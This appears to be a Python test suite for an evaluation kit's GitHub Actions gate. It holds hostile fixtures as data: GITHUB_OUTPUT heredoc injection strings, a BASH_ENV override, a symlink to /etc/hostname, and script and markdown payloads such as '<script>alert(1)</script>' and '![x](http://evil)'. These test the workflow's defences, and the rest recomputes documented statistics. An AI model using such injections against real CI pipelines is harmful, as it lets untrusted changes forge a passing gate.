        self.assertEqual(runner.jobs["evals"]["outputs"], {"run_exit_code": "0"})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "regression", "exit_code": "1"}, self.logs(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")

    def test_h2_an_unterminated_heredoc_with_a_guessable_delimiter_is_blocked(self):
        runner = self.attack(adapter_writing_to_github_output("exit_code<<exit_code=0\n3\nverdict=pass\n"))
        self.assertEqual(self.attack_violations(runner), [], self.logs(runner))
        self.assertIn("not a number evalsprint writes", self.gate_md(runner))
        self.assertEqual(self.evalsprint_commands(runner, "compare"), [])  # nothing was compared: there was no candidate to trust

    def test_h4_a_pr_that_redefines_echo_in_the_step_shell_is_blocked(self):
        runner = self.attack(stub_env={"BASH_ENV": str(self.evil_bash_env)})
        self.assertEqual(self.attack_violations(runner), [], self.logs(runner))

    def test_control_the_same_attacks_turn_the_regression_green_against_the_pre_fix_workflow(self):
        """The frozen workflow of the release candidate copies the job output byte for byte: H2 and H4 flip the gate, as the critic showed."""
        for name, kwargs in (
            ("H2", dict(adapter=adapter_writing_to_github_output("exit_code<<exit_code=0\n3\nverdict=pass\n"))),
            ("H4", dict(stub_env={"BASH_ENV": str(self.evil_bash_env)})),
        ):
            with self.subTest(attack=name):
                runner = self.attack(workflow=self.unvalidated, **kwargs)
                self.assertEqual(runner.jobs["evals"]["outputs"]["run_exit_code"], "3\nverdict=pass", self.logs(runner))
                self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "pass", self.logs(runner))
                self.assertEqual(runner.jobs["gate"]["result"], "success")
                self.assertNotEqual(self.attack_violations(runner), [], "the check the shipped workflow passes must fail on this one")

    def test_a_genuine_zero_with_forged_files_is_still_the_documented_limit(self):
        """Not closed by validation and not claimed to be: the exit code `0` is genuine, the candidate is made up (see TamperTests)."""
        runner = self.attack(ADAPTER_FORGES_ITS_RESULTS)
        self.assertEqual(runner.jobs["evals"]["outputs"], {"run_exit_code": "0"})
        self.assertEqual(self.verdict(runner), "pass", self.logs(runner))


@needs_tools
class MutationTests(InjectionChecks):
    """Each layer of the defence is removed in turn, from a copy of the SHIPPED workflow, and the matching check must go red.

    A check that cannot fail proves nothing. The checks are the ones OutputInjectionTests runs against the shipped file; here they are
    run against the file with one validation deleted, and must report violations (and report none against the unmodified copy).
    """

    def mutated(self, *layers: str) -> Path:
        text = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        for layer in layers:
            pattern, count = VALIDATION_LINES[layer]
            text, removed = re.subn(pattern, "", text)
            self.assertEqual(removed, count, f"the mutation `{layer}` no longer matches the validation it is meant to remove")
        path = self.tmp / f"mutated_{'_'.join(layers) or 'none'}.yml"
        path.write_text(text, encoding="utf-8")
        return path

    def test_the_unmodified_copy_passes_every_check(self):
        copy = self.mutated()
        self.assertEqual(copy.read_text(encoding="utf-8"), (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8"))
        self.assertEqual(self.plan_violations(copy), [])
        self.assertEqual(self.verdict_violations(copy), [])
        self.assertEqual(self.gate_violations(copy), [])

    def test_without_the_plan_steps_validation_the_plan_check_fails(self):
        self.assertTrue(self.plan_violations(self.mutated("plan")))

    def test_without_the_verdict_steps_closed_set_the_verdict_check_fails(self):
        self.assertTrue(self.verdict_violations(self.mutated("verdict")))

    def test_without_the_gate_jobs_check_the_gate_check_fails(self):
        self.assertTrue(self.gate_violations(self.mutated("gate")))

    def test_without_any_validation_the_attack_is_no_longer_read_as_garbled(self):
        """End to end, with the real CLI. (The Plan step's output file is itself a line-oriented file, so even here the injection does not
        reach the verdict as `pass`: it is read as a plain `3`. The check still fails, because the attack must be recognised, not merely survived.)"""
        runner = self.attack(adapter_writing_to_github_output("exit_code<<exit_code=0\n3\nverdict=pass\n"), workflow=self.mutated("plan", "verdict", "gate"))
        problems = self.attack_violations(runner)
        self.assertTrue(problems, "the end-to-end check cannot tell the validated workflow from one without validation")
        self.assertFalse(any("not live" in p for p in problems), problems)  # the attack did land in the evals job output
        # A second mutation that matters more: the old behaviour itself, Plan passing the raw text on, is the frozen fixture (see above).


@needs_tools
class ArtifactListTests(PrWorkflowBase):
    """C16: artifacts carry an explicit list of files, never a folder; the compare job filters what it takes from the candidate
    artifact once more; retention is one setting. Data handling of the artifacts themselves: github/README.md, section 11."""

    REPORT_FILES = ["candidate/report.html", "candidate/results.jsonl", "candidate/summary.json", "gate.json", "gate.md"]

    def compare_only(self, artifact: dict, run_code: str = "0", trusted: str = "true", **stub_env) -> Runner:
        """The compare and gate jobs on a candidate artifact that the test wrote (the evals job is seeded as finished)."""
        return self.scenario(
            only=("compare", "gate"),
            seed={
                **KEYS,
                **RELEVANT,
                "trusted": {"outputs": {"available": trusted, "missing": "false", "missing_why": "", "base_sha": "main"}},
                "evals": {"result": "success", "outputs": {"run_exit_code": run_code}},
            },
            artifacts={f"eval-candidate-7/{name}": content for name, content in artifact.items()},
            stub_env={"STUB_COMPARE_EXIT": 0, **stub_env},
        )

    def test_every_uploaded_path_names_a_file_never_a_folder_or_a_pattern(self):
        seen = 0
        for job_id, job in load_workflow(PR_WORKFLOW)["jobs"].items():
            for step in job["steps"]:
                if str(step.get("uses", "")).startswith("actions/upload-artifact"):
                    lines = [line.strip() for line in step["with"]["path"].splitlines() if line.strip()]
                    with self.subTest(job=job_id, artifact=step["with"]["name"]):
                        self.assertEqual(len(lines), len(set(lines)))
                        for line in lines:
                            seen += 1
                            self.assertRegex(line, r"\.(jsonl|json|html|md)$")
                            self.assertNotRegex(line, r"[*?\[]")
        self.assertEqual(seen, 4 + 6 + 1)  # candidate (4 files), report (6), comment text (1)
        self.assertNotIn("upload-artifact", (GITHUB / BASELINE_WORKFLOW).read_text(encoding="utf-8"))  # the baseline travels in a reviewed PR, not an artifact

    def test_the_candidate_artifact_holds_the_listed_files_and_not_what_the_run_left_beside_them(self):
        left_behind = [".label_secret", "run_meta.json", "results.partial.jsonl", "evil.html", "notes.txt"]
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0, "STUB_EXTRA_FILES": json.dumps(left_behind)})
        candidate_dir = runner.workspace_paths["evals"] / "runs" / "candidate"
        self.assertTrue(all((candidate_dir / name).exists() for name in left_behind))  # they were there...
        self.assertEqual(runner.uploads["eval-candidate-7"]["files"], ["results.jsonl", "summary.json"])  # ...and stayed in the job
        self.assertEqual(runner.uploads["eval-candidate-7"]["job"], "evals")
        self.assertEqual(runner.uploads["eval-report-7"]["files"], self.REPORT_FILES)
        self.assertEqual(runner.uploads["eval-gate-7"]["files"], ["gate.md"])

    def test_the_compare_job_takes_only_the_listed_regular_files_from_the_artifact(self):
        hostile = {
            "results.jsonl": "", "summary.json": "{}", "calibration.json": "{}", "report.html": "<script>alert(1)</script>", "evil.py": "print(1)", "nested/results.jsonl": "x",
        }  # fmt: skip
        runner = self.compare_only(hostile, STUB_REPORT_EXIT=1)  # the kit's own report fails: a report.html made by the PR must not stand in for it
        staged = sorted(p.name for p in (runner.temp_of("compare") / "eval-out" / "candidate").iterdir())
        self.assertEqual(staged, ["calibration.json", "results.jsonl", "summary.json"])
        self.assertEqual(runner.uploads["eval-report-7"]["files"], ["candidate/calibration.json", "candidate/results.jsonl", "candidate/summary.json", "gate.json", "gate.md"])
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_on_the_first_install_the_report_made_in_the_evals_job_is_kept_because_nothing_trusted_can_make_it(self):
        runner = self.compare_only({"results.jsonl": "", "summary.json": "{}", "report.html": "<html>candidate alone</html>"}, trusted="false")
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "bootstrap", "exit_code": "0"})
        self.assertEqual(runner.uploads["eval-report-7"]["files"], ["candidate/report.html", "candidate/results.jsonl", "candidate/summary.json", "gate.md"])

    def test_a_symlink_in_the_artifact_is_never_followed(self):
        runner = self.compare_only({"results.jsonl": ("symlink", "/etc/hostname"), "summary.json": "{}"})
        self.assertEqual(runner.jobs["compare"]["steps"]["stage"]["outcome"], "failure")
        self.assertIn("has no results.jsonl", runner.jobs["compare"]["log"])
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "error", "exit_code": "255"})
        self.assertIn("the download of the candidate run", self.gate_md(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertEqual(self.evalsprint_commands(runner, "compare"), [])

    def test_a_candidate_without_its_results_or_its_summary_is_an_error_not_a_comparison(self):
        for name in ("results.jsonl", "summary.json"):
            with self.subTest(missing=name):
                files = {"results.jsonl": "", "summary.json": "{}", "calibration.json": "{}"}
                del files[name]
                runner = self.compare_only(files)
                self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "error", "exit_code": "255"})
                self.assertEqual(runner.jobs["gate"]["result"], "failure")
                self.assertEqual(self.evalsprint_commands(runner, "compare"), [])

    def test_retention_is_one_setting_and_the_comment_text_keeps_one_day(self):
        default = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual({name: up["retention_days"] for name, up in default.uploads.items()}, {"eval-candidate-7": "14", "eval-report-7": "14", "eval-gate-7": "1"})

        def three_days(doc):
            doc["env"]["ARTIFACT_RETENTION_DAYS"] = "3"

        short = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0}, patch=three_days)
        self.assertEqual({name: up["retention_days"] for name, up in short.uploads.items()}, {"eval-candidate-7": "3", "eval-report-7": "3", "eval-gate-7": "1"})
        env = load_workflow(PR_WORKFLOW)["env"]
        self.assertEqual(env["ARTIFACT_RETENTION_DAYS"], "14")
        text = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        self.assertNotIn("retention-days: 14", text)  # no number pasted into a step

    def test_the_unhealthy_table_prints_numbers_only(self):
        """summary.json is written by the PR's run: a string in it never reaches the comment."""
        hostile = json.dumps({"n_errors": "<b>9</b>", "n_cases": "::error::pwn", "n_target_errors": [1], "n_judge_errors": True, "error_rate": "50%", "n_attempts": {"x": 1}, "attempt_error_rate": "![x](http://evil)"})
        md = self.gate_md(self.decide("3", files={"eval-out/candidate/summary.json": hostile}))
        self.assertIn("| Cases with an error | n/a of n/a |", md)
        self.assertIn("| Target errors (the system under test) | n/a |", md)
        self.assertIn("| Judge errors (the grader) | n/a |", md)
        self.assertIn("| Error rate | n/a |", md)
        for raw in ("pwn", "<b>", "evil", "50%"):
            self.assertNotIn(raw, md)
        for huge in ('{"n_errors": 1e400, "error_rate": 1e400}', '{"n_errors": %s}' % ("9" * 50), "[1, 2]", '"text"'):
            with self.subTest(huge=huge[:30]):
                md = self.gate_md(self.decide("3", files={"eval-out/candidate/summary.json": huge}))
                self.assertIn("| Cases with an error | n/a of n/a |", md)
        repeated = json.dumps({"n_cases": 20, "n_errors": 0, "n_attempts": 60, "n_attempt_errors": 12, "attempt_error_rate": 0.2, "error_rate": 0.0})
        md = self.gate_md(self.decide("3", files={"eval-out/candidate/summary.json": repeated}))
        self.assertIn("| Attempts with an error | 12 of 60 |", md)
        self.assertIn("| Attempt error rate | 20.0% |", md)


def shared_gate_numbers():
    """`scripts/gate_numbers.py`, loaded once per process.

    Its `rate` is memoised, so the exact sums (a second each at n = 500) are paid for once by every doc-number test class, and the
    four classes that recompute the docs' figures cannot disagree about which copy of the module they ran.
    """
    import importlib.util

    module = sys.modules.get("gate_numbers")
    if module is None:
        spec = importlib.util.spec_from_file_location("gate_numbers", ROOT / "scripts" / "gate_numbers.py")
        module = importlib.util.module_from_spec(spec)
        sys.modules["gate_numbers"] = module
        spec.loader.exec_module(module)
    return module


class DocsNumbersTests(unittest.TestCase):
    """The false-alarm and detection tables in the docs are recomputed, not remembered.

    `scripts/gate_numbers.py` is an independent, exact re-derivation of the default gate's behavior
    (model B of the cycle-1 critic). If someone edits a number in a README, or the gate rule changes
    without the tables, this fails.
    """

    @classmethod
    def setUpClass(cls):
        cls.gn = shared_gate_numbers()

    # n = 400 is exact too and takes a fraction of a second now (the gate is a short list of (b, c) pairs).
    SIZES = [45, 100, 200, 400]

    @classmethod
    def rows(cls, path: Path, header_has: str, sizes=None) -> dict[int, list[str]]:
        """{n: cells after the first} of the rows of the ONE markdown table whose header row contains `header_has`.

        The first cell is `45` or `n = 45`. Choosing the table by its header keeps a table added to a doc (the rule table, the
        repeat table) from being mistaken for another one, and makes a renamed or removed table fail loudly.
        """
        sizes = cls.SIZES if sizes is None else sizes
        out: dict[int, list[str]] = {}
        header = ""
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line.startswith("|"):
                header = ""
                continue
            cells = [c.strip().replace("*", "") for c in line.strip("|").split("|")]
            if not header:
                header = line  # the first row of a table is its header
                continue
            match = re.fullmatch(r"(?:n = )?(\d+)", cells[0])
            if header_has in header and match and int(match.group(1)) in sizes:
                out[int(match.group(1))] = cells[1:]
        return out

    @staticmethod
    def pct1(x: float) -> str:
        return f"{x * 100:.1f}%"

    @staticmethod
    def pct_detect(x: float) -> str:
        v = x * 100
        return "100%" if round(v, 1) >= 99.95 else (f"{v:.1f}%" if v >= 99 else f"{v:.0f}%")

    def test_top_level_readme_table(self):
        rows = self.rows(ROOT / "README.md", "False alarm at 2% / 5% / 10% noise")
        self.assertEqual(sorted(rows), sorted(self.SIZES))
        for n, cells in rows.items():
            fa = " / ".join(self.pct1(self.gn.rate(n, p, 0.0)) for p in (0.02, 0.05, 0.10))
            det = [self.pct_detect(self.gn.rate(n, 0.05, d)) for d in (0.05, 0.10, 0.15)]
            self.assertEqual(cells, [fa, *det], f"README.md, n = {n}")

    def test_gate_readme_tables(self):
        false_alarm = self.rows(GITHUB / "README.md", "2% noise")
        detection = self.rows(GITHUB / "README.md", "5 p.p. drop")
        self.assertEqual(sorted(false_alarm), sorted(self.SIZES))
        self.assertEqual(sorted(detection), sorted(self.SIZES))
        for n in self.SIZES:
            self.assertEqual(false_alarm[n], [self.pct1(self.gn.rate(n, p, 0.0)) for p in (0.02, 0.05, 0.10)], f"false alarm, n = {n}")
            self.assertEqual(detection[n], [self.pct_detect(self.gn.rate(n, 0.05, d)) for d in (0.05, 0.10, 0.15)], f"detection, n = {n}")

    def test_the_rule_table_is_recomputed_and_matches_the_code(self):
        """k(n), alpha(n) and the fewest clean losses (c = 0) that trip, for the rule table of the CI README."""
        from evalsprint.compare import auto_alpha, auto_min_net_loss, auto_trips

        sizes = [45, 100, 150, 200, 300, 500]
        for path in (GITHUB / "README.md",):
            rows = self.rows(path, "Net loss needed", sizes)
            self.assertEqual(sorted(rows), sizes, path.name)
            for n, (k_cell, alpha_cell, clean_cell) in rows.items():
                k = self.gn.min_net_loss(n)
                clean = next(b for b in range(1, n + 1) if self.gn.flag(b, 0, n))
                self.assertEqual(k_cell, str(k), f"{path.name}, n = {n}")
                self.assertEqual(alpha_cell, f"{self.gn.alpha(n):.4f}", f"{path.name}, n = {n}")
                self.assertEqual(clean_cell, f"{clean} ({clean / n * 100:.1f} p.p.)", f"{path.name}, n = {n}")
                # the script and the code agree, and the boundary is where the table says
                self.assertEqual((auto_min_net_loss(n), round(auto_alpha(n), 12)), (k, round(self.gn.alpha(n), 12)))
                self.assertTrue(auto_trips(clean, 0, n))
                self.assertFalse(auto_trips(clean - 1, 0, n))

    def test_the_script_and_the_code_agree_on_every_pair(self):
        """`scripts/gate_numbers.py` re-derives the rule independently: it must trip on exactly the pairs `compare` trips on."""
        from evalsprint.compare import auto_trips

        for n in (10, 45, 60, 100, 149, 150, 200, 301, 500):
            for b in range(0, min(n, 40) + 1):
                for c in range(0, min(n - b, 40) + 1):
                    if self.gn.flag(b, c, n) != auto_trips(b, c, n):
                        self.fail(f"n={n} b={b} c={c}: script {self.gn.flag(b, c, n)} compare {auto_trips(b, c, n)}")

    def test_the_repeat_table_is_recomputed(self):
        """`repeat: {n: 3}` numbers: the same exact sum with the flip probability of a majority of three attempts."""
        rows = self.rows(GITHUB / "README.md", "False alarm, 1 attempt to 3", [30, 45, 60, 100, 149])
        self.assertEqual(sorted(rows), [30, 45, 60, 100, 149])
        for n, cells in rows.items():
            expected = []
            for d in (0.0, 0.10, 0.05):
                one, three = self.gn.rate(n, 0.05, d), self.gn.repeat_rate(n, 0.05, d, 3)
                expected.append(f"{one * 100:.1f}% to {three * 100:.1f}%")
            self.assertEqual(cells, expected, f"repeat table, n = {n}")
        self.assertAlmostEqual(self.gn.majority_flip(3, 0.05), 0.00725, places=9)
        with self.assertRaises(ValueError):  # a tie fails: an even count is not symmetric, so the model refuses it
            self.gn.majority_flip(4, 0.05)
        # the figures quoted in prose and in the template comment
        prose = {
            "README.md": ROOT / "README.md",
            "github/README.md": GITHUB / "README.md",
            "docs/ARCHITECTURE.md": ROOT / "docs" / "ARCHITECTURE.md",
            "templates/eval.yaml": TEMPLATES / "eval.yaml",
        }
        fa1, fa3 = self.gn.rate(45, 0.05, 0.0), self.gn.repeat_rate(45, 0.05, 0.0, 3)
        d1, d3 = self.gn.rate(45, 0.05, 0.10), self.gn.repeat_rate(45, 0.05, 0.10, 3)
        self.assertEqual((self.pct1(fa1), self.pct1(fa3), self.pct1(d1), self.pct1(d3)), ("10.6%", "0.3%", "66.6%", "81.6%"))
        for name, path in prose.items():
            text = path.read_text(encoding="utf-8")
            for figure in ("10.6%", "0.3%", "66.6%", "81.6%"):
                with self.subTest(file=name, figure=figure):
                    self.assertIn(figure, text)

    def test_the_curve_claims_are_recomputed_for_every_size(self):
        """The shape claims of the docs, for every n from 30 to 500 at 5% noise (about 40 seconds: two exact sums per size).

        False alarm peaks at 12.3% at n = 54 and is above 11% for n = 47 to 54 and 62 to 72; it is at most 4.3% for every
        n in [150, 500]; and the detection of a 10 p.p. drop never falls more than 2.59 p.p. below its best value at a smaller size.
        """
        sizes = range(30, 501)
        fa = {n: self.gn.rate(n, 0.05, 0.0) for n in sizes}
        det = {n: self.gn.rate(n, 0.05, 0.10) for n in sizes}
        peak_n = max((n for n in sizes if n <= 149), key=fa.get)
        self.assertEqual((peak_n, self.pct1(fa[peak_n])), (54, "12.3%"))
        runs, start = [], None
        for n in range(30, 151):
            if fa[n] > 0.11 and start is None:
                start = n
            if fa[n] <= 0.11 and start is not None:
                runs.append((start, n - 1))
                start = None
        self.assertEqual(runs, [(47, 54), (62, 72)])
        self.assertEqual(round(max(fa[n] for n in sizes if n >= 150) * 100, 1), 4.3)
        best, drawdown = 0.0, 0.0
        for n in sizes:
            best = max(best, det[n])
            drawdown = max(drawdown, best - det[n])
        self.assertEqual(round(drawdown * 100, 2), 2.59)
        for name, path in (("README.md", ROOT / "README.md"), ("github/README.md", GITHUB / "README.md"), ("docs/ARCHITECTURE.md", ROOT / "docs" / "ARCHITECTURE.md")):
            text = path.read_text(encoding="utf-8")
            with self.subTest(file=name):
                self.assertIn("12.3%", text)
                if name != "README.md":
                    self.assertIn("4.3%", text)
        for name, path in (("github/README.md", GITHUB / "README.md"), ("docs/ARCHITECTURE.md", ROOT / "docs" / "ARCHITECTURE.md")):
            with self.subTest(file=name, figure="v0.1 peak"):
                self.assertIn("21.0%", path.read_text(encoding="utf-8"))  # the previous rule's peak, from the gate executor's table
        self.assertIn("2.6 p.p.", (ROOT / "docs" / "METHODOLOGY.md").read_text(encoding="utf-8"))

    def test_prose_numbers_in_methodology(self):
        text = (ROOT / "docs" / "METHODOLOGY.md").read_text(encoding="utf-8")
        for n in (45, 100, 200):
            self.assertIn(self.pct1(self.gn.rate(n, 0.05, 0.0)).rstrip("%"), text, f"false alarm at n = {n}")
        self.assertIn("**10.6%** at n = 45, 7.1% at n = 100 and 4.0% at n = 200", text)
        self.assertIn("67%, 80% and 93%", text)
        self.assertEqual([round(self.gn.rate(n, 0.05, 0.10) * 100) for n in (45, 100, 200)], [67, 80, 93])
        self.assertIn("a 5 p.p. drop 39%, 42% and 51%", text)
        self.assertEqual([round(self.gn.rate(n, 0.05, 0.05) * 100) for n in (45, 100, 200)], [39, 42, 51])

    @staticmethod
    def majority_fails(attempts: int, p: float) -> float:
        """P(a case's verdict is fail) when each attempt fails with probability p; ties fail (contract C2)."""
        need = attempts // 2 + 1 if attempts % 2 else attempts // 2
        return sum(math.comb(attempts, j) * p**j * (1 - p) ** (attempts - j) for j in range(need, attempts + 1))

    def test_critical_tag_numbers_are_recomputed(self):
        """8 critical cases, 5% noise per attempt: why the docs say repeat 5 times with a majority vote."""
        def false_alarm(attempts: int, cases: int = 8, noise: float = 0.05) -> float:
            q = self.majority_fails(attempts, noise)  # baseline passes (1 - q), candidate fails (q): a pass -> fail flip
            return 1 - (1 - (1 - q) * q) ** cases

        self.assertEqual([round(false_alarm(k) * 100, 2) for k in (1, 3, 5)], [32.25, 5.61, 0.92])
        self.assertEqual([round(self.majority_fails(k, 0.8) * 100, 1) for k in (1, 3, 5)], [80.0, 89.6, 94.2])  # a case that really broke
        unanimity = 1 - (1 - (1 - 0.05**3) * 0.05**3) ** 8
        self.assertEqual((round(unanimity * 100, 2), round(0.8**3 * 100)), (0.10, 51))
        from evalsprint.compare import RECOMMENDED_CRITICAL_REPEATS, _critical_false_alarm

        self.assertEqual(RECOMMENDED_CRITICAL_REPEATS, 5)
        for k in (1, 3, 5):
            self.assertAlmostEqual(_critical_false_alarm(8, k), false_alarm(k), places=9)  # the number compare prints
        for name, path in (("README.md", ROOT / "README.md"), ("METHODOLOGY.md", ROOT / "docs" / "METHODOLOGY.md"), ("templates/github/README.md", GITHUB / "README.md")):
            text = path.read_text(encoding="utf-8")
            for figure in ("0.92%", "5.6%", "94%", "n: 5"):
                with self.subTest(file=name, figure=figure):
                    self.assertIn(figure, text)
            self.assertNotIn("about 0.3%", text)  # an earlier, wrong figure for the majority of three

    def test_perfect_agreement_label_counts_are_recomputed(self):
        """When is a judge that agrees with every human label first released, and first `trustworthy`? The real calibrate() decides.

        Every case labeled, nobody disagrees, human pass rate 50 / 70 / 80 / 90%, every size from 30 labels up to the first
        `trustworthy`. The kappa interval is a seeded bootstrap, so these are exact and the same on every Python version; a
        change to the rule changes them and fails this test. (The scan in
        orchestration/2026-09-29_kit-v0.2/cycle3/mlops-engineer/perfect_agreement_scan.txt also gives the size from which each
        property STAYS true: the seeded interval is not monotone in n.)
        """
        from evalsprint.calibration import MIN_LABELS_RELEASE, calibrate
        from tests.test_calibration import confusion_scenario

        def cal(n: int, human_pass: float) -> dict:
            passes = round(human_pass * n)
            run, labels = confusion_scenario(passes, 0, 0, n - passes)
            return calibrate(run, labels)

        def first(rows: dict, test) -> int:
            return next(n for n in sorted(rows) if test(rows[n]))

        self.assertEqual(MIN_LABELS_RELEASE, 40)
        expected = {  # human pass rate -> first size with: released, weighted lower bound >= 0.8, tnr_reliable, trustworthy
            0.5: (40, 32, 30, 40),
            0.7: (40, 39, 32, 41),
            0.8: (40, 53, 48, 53),
            0.9: (45, 96, 96, 96),
        }
        for human_pass, (released, lower_08, tnr, trustworthy) in expected.items():
            with self.subTest(human_pass=human_pass):
                rows = {n: cal(n, human_pass) for n in range(30, max(released, lower_08, tnr, trustworthy) + 1)}
                self.assertEqual(first(rows, lambda r: r["kappa_decision"] in ("usable", "trustworthy")), released)
                self.assertEqual(first(rows, lambda r: bool(r["kappa_weighted_ci"]) and r["kappa_weighted_ci"][0] >= 0.8), lower_08)
                self.assertEqual(first(rows, lambda r: r["tnr_reliable"]), tnr)
                self.assertEqual(first(rows, lambda r: r["kappa_decision"] == "trustworthy"), trustworthy)
                self.assertEqual(rows[released - 1]["kappa_decision"], "inconclusive")
                # `trustworthy` needs the released rule, a weighted lower bound >= 0.8 AND a reliable true-negative rate
                reached = rows[trustworthy]
                self.assertTrue(reached["tnr_reliable"])
                self.assertGreaterEqual(reached["kappa_weighted_ci"][0], 0.8)
                self.assertGreaterEqual(len(rows) and trustworthy - round(human_pass * trustworthy), 10)  # at least 10 human fails
                big = cal(120, human_pass)
                self.assertEqual((big["kappa_decision"], big["tnr_reliable"]), ("trustworthy", True))
        figures = "32, 39, 53 and 96"
        for name, path in (("README.md", ROOT / "README.md"), ("docs/METHODOLOGY.md", ROOT / "docs" / "METHODOLOGY.md"), ("docs/ARCHITECTURE.md", ROOT / "docs" / "ARCHITECTURE.md")):
            text = path.read_text(encoding="utf-8")
            with self.subTest(file=name):
                if name == "README.md":  # C25b: the client-facing README keeps only the budget-table figures (40, 48, 67 and 124), not the exact-share scan
                    self.assertNotIn(figures, text)
                    self.assertNotIn("40, 41, 53 and 96", text)
                    self.assertIn("40, 48, 67 and 124 labels respectively", text)
                else:
                    self.assertIn(figures, text)
                self.assertIn("40 labels (45 when 90% of the human labels are pass)", text)
                self.assertNotIn("35 labels at a 50%", text)  # the Wilson-floor figures of the first round
                self.assertNotRegex(text, r"(?<![\w.])103 labels|at 103\b")  # the label count of an earlier round ("103 before the fix" is the review's cell count)

    def test_the_docs_describe_the_calibration_and_comparison_keys_the_code_returns(self):
        """A key the code returns must be in ARCHITECTURE.md; the docs must not name keys the code no longer has."""
        from evalsprint.calibration import calibrate
        from tests.test_calibration import confusion_scenario

        run, labels = confusion_scenario(30, 0, 5, 25)
        result = calibrate(run, labels)
        arch = (ROOT / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
        for key in ("kappa_weighted", "kappa_weighted_ci", "kappa_ci_bootstrap", "kappa_weighted_ci_bootstrap", "kappa_ci_smoothing", "kappa_decision_basis", "min_labels_release", "n_labelable", "labels_needed_capped"):
            with self.subTest(key=key):
                self.assertIn(key, result)
                self.assertIn(key, arch)
        for gone in ("kappa_ci_source", "_kappa_floor"):
            with self.subTest(gone=gone):
                self.assertNotIn(gone, result)
        self.assertEqual(result["kappa_decision_basis"], "weighted")
        # The comparison keys, from a real (offline) comparison of two runs of the demo.
        env = {**os.environ, "PYTHONPATH": str(ROOT), "PYTHONUTF8": "1"}
        with tempfile.TemporaryDirectory() as tmp:
            for name in ("a", "b"):
                done = subprocess.run(
                    [sys.executable, "-m", "evalsprint", "run", "-c", str(ROOT / "examples" / "support_bot" / "eval.yaml"), "--limit", "6", "--no-report", "--quiet", "--out", str(Path(tmp) / name)],
                    cwd=tmp, env=env, capture_output=True, text=True, encoding="utf-8",
                )
                self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
            done = subprocess.run(
                [sys.executable, "-m", "evalsprint", "compare", str(Path(tmp) / "a"), str(Path(tmp) / "b"), "--json", str(Path(tmp) / "c.json")],
                cwd=tmp, env=env, capture_output=True, text=True, encoding="utf-8",
            )
            self.assertIn(done.returncode, (0, 1), done.stdout + done.stderr)
            comparison = json.loads((Path(tmp) / "c.json").read_text(encoding="utf-8"))
        for where, key in (
            (comparison, "target_error_regressions"),
            (comparison["pass_rate"], "candidate_paired_pessimistic"),
            (comparison["pass_rate"], "candidate_paired_pessimistic_n"),
            (comparison["errors"]["candidate"], "paired_error_rate"),
            (comparison["errors"]["candidate"], "paired_n_errors"),
            (comparison["errors"]["candidate"], "paired_n_cases"),
        ):
            with self.subTest(key=key):
                self.assertIn(key, where)
                self.assertIn(key, arch)

    def test_every_key_of_a_real_run_a_resume_and_a_comparison_is_named_in_the_architecture_doc(self):
        """A key the code writes is a contract: each one in summary.json, results.jsonl, run_meta.json and a comparison is in ARCHITECTURE.md."""
        arch = (ROOT / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
        env = {**os.environ, "PYTHONPATH": str(ROOT), "PYTHONUTF8": "1"}
        demo = str(ROOT / "examples" / "support_bot" / "eval.yaml")

        def cli(tmp: str, *args: str, ok=(0,)) -> None:
            done = subprocess.run([sys.executable, "-m", "evalsprint", *args], cwd=tmp, env=env, capture_output=True, text=True, encoding="utf-8")
            self.assertIn(done.returncode, ok, done.stdout + done.stderr)

        def documented(key: str) -> bool:
            return bool(re.search(r'[`"]' + re.escape(key) + r'[`"]', arch))

        # Dicts whose keys are the user's own names (tags, judges, models, tag groups, target params, what a target returns) or the gate block
        # (every key of it is checked against DEFAULT_GATE elsewhere) are not part of the contract.
        def keys(data: dict, skip=("per_tag", "per_judge", "tags", "cases", "by_tag", "by_judge", "models", "tag_groups", "gate", "judges_config", "params", "target", "callable", "output", "metadata")) -> list[str]:
            out = []
            for key, value in data.items():
                out.append(key)
                if isinstance(value, dict) and key not in skip:
                    out.extend(keys(value, skip))
            return out

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            common = ["-c", demo, "--limit", "4", "--no-report", "--quiet"]
            cli(tmp, "run", *common, "--out", str(root / "a"))
            cli(tmp, "run", *common, "--resume", str(root / "a"), "--out", str(root / "b"))
            cli(tmp, "compare", str(root / "a"), str(root / "b"), "--json", str(root / "c.json"), ok=(0, 1))
            loaded = {
                "summary (fresh run)": json.loads((root / "a" / "summary.json").read_text(encoding="utf-8")),
                "summary (resumed run)": json.loads((root / "b" / "summary.json").read_text(encoding="utf-8")),
                "result record": json.loads((root / "a" / "results.jsonl").read_text(encoding="utf-8").splitlines()[0]),
                "run_meta.json": json.loads((root / "b" / "run_meta.json").read_text(encoding="utf-8")),
                "comparison": json.loads((root / "c.json").read_text(encoding="utf-8")),
            }
        self.assertIn("resumed_from", loaded["summary (resumed run)"])
        self.assertIn("resumed_from", loaded["run_meta.json"])
        for what, data in loaded.items():
            for key in keys(data):
                with self.subTest(document=what, key=key):
                    self.assertTrue(documented(key), f"`{key}` is written in the {what} but ARCHITECTURE.md never names it")

    def test_rule_10_is_documented_the_way_the_gate_applies_it(self):
        """Gate rule 10 reads the weighted kappa and the decision; the docs must say what the real gate does, not the old rule."""
        from evalsprint.calibration import calibrate
        from evalsprint.report import render_report
        from tests.test_calibration import FAST, confusion_scenario
        from tests.test_compare import BASE_100, compare

        def gate_on(calibration, **gate):
            return compare(BASE_100, BASE_100, gate={"require_calibration": True, **gate}, calibration=calibration, base_kw={"llm": True}, cand_kw={"llm": True})

        run, labels = confusion_scenario(30, 2, 3, 25)
